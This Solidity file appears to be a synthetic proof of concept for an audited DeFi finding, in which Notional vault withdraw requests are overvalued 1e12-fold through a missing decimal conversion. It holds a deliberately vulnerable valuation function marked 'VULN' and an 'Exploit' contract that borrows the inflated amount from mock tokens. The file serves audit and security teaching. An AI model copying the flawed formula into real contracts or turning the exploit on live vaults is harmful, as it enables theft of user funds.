// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional Leveraged Vaults — a split withdraw request is valued in the
    redemption token's decimals (Sherlock 2024-06, finding 35118, H-5).
    SYNTHETIC, cheatcode-free. The share-value return is the audited formula.
    Root cause: the 18-decimal exchange rate is applied to an 18-decimal
    redemption amount and the result is not scaled down to the 6-decimal
    borrow token. 100 RT at 10 BT each, of which this request owns half,
    is worth 500 BT (500e6) and is valued as 500000000000000000000.
    This is not the PT-decimal divisor bug. getOraclePrice already returns
    10e18, meaning 1 RT = 10 BT. The control multiplies by borrow precision
    and divides by redemption precision. */

library TypeConvert {
    function toUint(int256 x) internal pure returns (uint256) {
        require(x >= 0);
        return uint256(x);
    }
}

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    mapping(address => uint256) public balanceOf;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Correct 18-decimal rate. 1 redemption token = 10 borrow tokens. Not a decimal-scale bug.
contract TradingModule {
    function getOraclePrice(address, address) external pure returns (int256 answer, int256 decimals) {
        answer = 10 ether;
        decimals = 1 ether;
    }
}

struct WithdrawRequest {
    uint256 vaultShares;
}

struct SplitWithdrawRequest {
    uint256 totalWithdraw;
    uint256 totalVaultShares;
}

contract WithdrawRequestBase {
    using TypeConvert for int256;

    uint256 public constant EXCHANGE_RATE_PRECISION = 1e18;
    uint256 public constant BORROW_PRECISION = 1e6;
    uint256 public constant REDEMPTION_PRECISION = 1e18;

    MiniToken public borrowToken;
    MiniToken public redeemToken;
    TradingModule public trading;

    constructor(MiniToken borrowToken_, MiniToken redeemToken_, TradingModule trading_) {
        borrowToken = borrowToken_;
        redeemToken = redeemToken_;
        trading = trading_;
    }

    function _getValueOfSplitFinalizedWithdrawRequest(
        WithdrawRequest memory w,
        SplitWithdrawRequest memory s,
        address borrow,
        address redeem
    ) internal view returns (uint256) {
        if (borrow == redeem) {
            return (s.totalWithdraw * w.vaultShares) / s.totalVaultShares;
        } else {
            (int256 rate, /* */) = trading.getOraclePrice(redeem, borrow);
            // @> VULN: redemption decimals are not converted into borrow decimals, so the share value is 1e12 too large
            return (s.totalWithdraw * rate.toUint() * w.vaultShares) /
                (s.totalVaultShares * EXCHANGE_RATE_PRECISION);
        }
    }

    function fairValue(WithdrawRequest memory w, SplitWithdrawRequest memory s) public view returns (uint256) {
        (int256 rate, /* */) = trading.getOraclePrice(address(redeemToken), address(borrowToken));
        return (s.totalWithdraw * rate.toUint() * w.vaultShares * BORROW_PRECISION) /
            (s.totalVaultShares * EXCHANGE_RATE_PRECISION * REDEMPTION_PRECISION);
    }

    function quote(WithdrawRequest memory w, SplitWithdrawRequest memory s) external view returns (uint256) {
        return _getValueOfSplitFinalizedWithdrawRequest(w, s, address(borrowToken), address(redeemToken));
    }

    function borrow(WithdrawRequest memory w, SplitWithdrawRequest memory s) external returns (uint256 amount) {
        amount = _getValueOfSplitFinalizedWithdrawRequest(w, s, address(borrowToken), address(redeemToken));
        borrowToken.transfer(msg.sender, amount);
    }
}

contract Exploit {
    uint256 public constant BUGGY = 500000000000000000000;
    uint256 public constant FAIR = 500000000;

    MiniToken public usdc; // nonce 1
    MiniToken public redeem; // nonce 2
    TradingModule public trading; // nonce 3
    WithdrawRequestBase public vault; // nonce 4

    uint256 public buggy;
    uint256 public fair;
    uint256 public borrowed;

    constructor() {
        usdc = new MiniToken("USD Coin", "USDC", 6);
        redeem = new MiniToken("Redemption token", "RT", 18);
        trading = new TradingModule();
        vault = new WithdrawRequestBase(usdc, redeem, trading);
        usdc.mint(address(vault), BUGGY);
    }

    function run() external {
        WithdrawRequest memory w = WithdrawRequest({vaultShares: 5e8});
        SplitWithdrawRequest memory s = SplitWithdrawRequest({totalWithdraw: 100 ether, totalVaultShares: 10e8});
        fair = vault.fairValue(w, s);
        buggy = vault.quote(w, s);
        borrowed = vault.borrow(w, s);
        (int256 rate,) = trading.getOraclePrice(address(redeem), address(usdc));
        require(rate == 10 ether, "rate");
        require(buggy == BUGGY, "buggy value");
        require(fair == FAIR, "fair value");
        require(borrowed == BUGGY, "borrow");
        require(usdc.balanceOf(address(this)) == BUGGY, "received");
        require(buggy / fair == 1e12, "1e12 overvalue");
    }
}
